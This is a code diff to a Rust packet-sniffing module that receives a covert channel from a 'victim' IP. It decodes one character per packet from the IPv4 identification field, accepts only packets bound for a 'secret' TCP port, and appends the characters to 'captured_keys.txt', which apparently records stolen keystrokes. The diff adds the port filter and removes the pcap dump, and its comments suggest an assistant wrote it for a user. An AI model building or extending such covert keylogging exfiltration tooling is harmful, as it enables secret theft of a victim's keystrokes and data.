@@ -1,5 +1,5 @@
 use chrono::Local;
-use pcap::{Capture, Device, Linktype};
+use pcap::{Capture, Device};
 use std::sync::{
     atomic::{AtomicBool, Ordering},
     Arc,
@@ -7,26 +7,25 @@ use std::sync::{
 use std::thread;
 use std::io::{self, Write};
 use std::fs::{OpenOptions, create_dir_all};
-use std::path::{Path, PathBuf};
+use std::path::Path;
 
 use pnet::packet::ipv4::Ipv4Packet;
+use pnet::packet::tcp::TcpPacket; // <--- Make sure this is imported
+use pnet::packet::Packet;         // <--- And this
 
 pub struct PcapHandle {
     running: Arc<AtomicBool>,
 }
 
 impl PcapHandle {
-    pub fn start(interface: &str, victim_ip: String) -> Self {
+    // CHANGE: Added `port: u16` to the arguments
+    pub fn start(interface: &str, victim_ip: String, port: u16) -> Self {
         let running = Arc::new(AtomicBool::new(true));
         let flag = running.clone();
         let iface = interface.to_string();
 
         thread::spawn(move || {
-            // ------------------------------------------------
-            // 1. Locate interface
-            // ------------------------------------------------
             let devices = Device::list().expect("Failed to list devices");
-
             let device = match devices.into_iter().find(|d| d.name == iface) {
                 Some(d) => d,
                 None => {
@@ -35,103 +34,75 @@ impl PcapHandle {
                 }
             };
 
-            // ------------------------------------------------
-            // 2. Ensure PCAP directory exists
-            // ------------------------------------------------
-            // From /source → ../data/pcaps
+            // Use the directory structure you confirmed
             let pcap_dir = Path::new("./data/pcaps");
-
             if let Err(e) = create_dir_all(pcap_dir) {
                 eprintln!("[!] Failed to create pcap directory: {}", e);
                 return;
             }
 
-            // ------------------------------------------------
-            // 3. Setup filenames
-            // ------------------------------------------------
-            let ts = Local::now().format("%Y%m%d_%H%M%S");
-
-            let mut pcap_path = PathBuf::from(pcap_dir);
-            pcap_path.push(format!("commander_{}.pcap", ts));
-
-            let mut log_path = PathBuf::from(pcap_dir);
-            log_path.push("captured_keys.txt");
-            println!("[DEBUG] Sniffer active. Logging to: {:?}", log_path);
-
-            println!("\n[*] PCAP capture active: {}", pcap_path.display());
-            println!("[*] Monitoring covert channel from: {}", victim_ip);
+            // Matches the filename in your output
+            let log_path = pcap_dir.join("captured_keys.txt"); 
+            println!("[DEBUG] Sniffer active on Port {}. Logging to: {:?}", port, log_path);
 
             // ------------------------------------------------
-            // 4. Open capture handle (blocking / event-driven)
+            // 3. Start Capture
             // ------------------------------------------------
-            let mut cap = Capture::from_device(device)
-                .unwrap()
-                .promisc(true)
-                .snaplen(65535)
-                .timeout(-1) // fully blocking
-                .open()
-                .unwrap();
+            let mut cap = match Capture::from_device(device) {
+                Ok(c) => c.promisc(true).immediate_mode(true).timeout(1000).open(),
+                Err(e) => {
+                    eprintln!("[!] Failed to open capture: {}", e);
+                    return;
+                }
+            };
 
-            // BPF filter (Layer 3)
-            let filter = format!("ip src {}", victim_ip);
-            cap.filter(&filter, true)
-                .expect("Failed to apply BPF filter");
+            let mut cap = match cap {
+                Ok(c) => c,
+                Err(_) => return,
+            };
 
-            let linktype = cap.get_datalink();
+            // Filter for TCP packets from the victim
+            // We can't filter by port in BPF easily if we are promiscuous, so we do it in logic below
+            let filter = format!("src host {}", victim_ip);
+            cap.filter(&filter, true).ok();
 
-            let mut dump = cap
-                .savefile(&pcap_path)
-                .expect("Failed to create pcap savefile");
-
-            // ------------------------------------------------
-            // 5. Capture loop
-            // ------------------------------------------------
             while flag.load(Ordering::Relaxed) {
-
                 if let Ok(packet) = cap.next_packet() {
+                    // Skip Ethernet header (14 bytes)
+                    let ip_start = 14;
+                    if packet.data.len() <= ip_start { continue; }
 
-                    // Write raw packet to PCAP
-                    dump.write(&packet);
+                    if let Some(ip_packet) = Ipv4Packet::new(&packet.data[ip_start..]) {
+                        // 1. Verify it's a TCP packet
+                        if let Some(tcp_packet) = TcpPacket::new(ip_packet.payload()) {
+                            
+                            // 2. CRITICAL FIX: Only accept packets destined for our Secret RX Port
+                            if tcp_packet.get_destination() == port {
+                                
+                                let covert_byte = (ip_packet.get_identification() & 0x00FF) as u8;
 
-                    // Determine Layer 3 offset
-                    let ip_start = match linktype {
-                        Linktype(1) => 14,   // Ethernet
-                        Linktype(113) => 16, // Linux cooked
-                        Linktype(0) => 4,    // Loopback
-                        _ => continue,
-                    };
+                                if (32..=126).contains(&covert_byte) {
+                                    let c = covert_byte as char;
 
-                    if packet.data.len() <= ip_start {
-                        continue;
-                    }
+                                    // Print to console
+                                    print!("{}", c);
+                                    io::stdout().flush().unwrap();
 
-                    if let Some(ip_packet) =
-                        Ipv4Packet::new(&packet.data[ip_start..])
-                    {
-                        let covert_byte =
-                            (ip_packet.get_identification() & 0x00FF) as u8;
-
-                        if (32..=126).contains(&covert_byte) {
-                            let c = covert_byte as char;
-
-                            // Print live
-                            print!("{}", c);
-                            io::stdout().flush().unwrap();
-
-                            // Append to file
-                            if let Ok(mut file) = OpenOptions::new()
-                                .create(true)
-                                .append(true)
-                                .open(&log_path)
-                            {
-                                write!(file, "{}", c).ok();
+                                    // Save to file
+                                    if let Ok(mut file) = OpenOptions::new()
+                                        .create(true)
+                                        .append(true)
+                                        .open(&log_path)
+                                    {
+                                        write!(file, "{}", c).ok();
+                                    }
+                                }
                             }
                         }
                     }
                 }
             }
-
-            println!("\n[*] Capture stopped for {}", victim_ip);
+            println!("\n[*] Capture stopped.");
         });
 
         Self { running }
@@ -143,4 +114,3 @@ impl Drop for PcapHandle {
         self.running.store(false, Ordering::Relaxed);
     }
 }
-
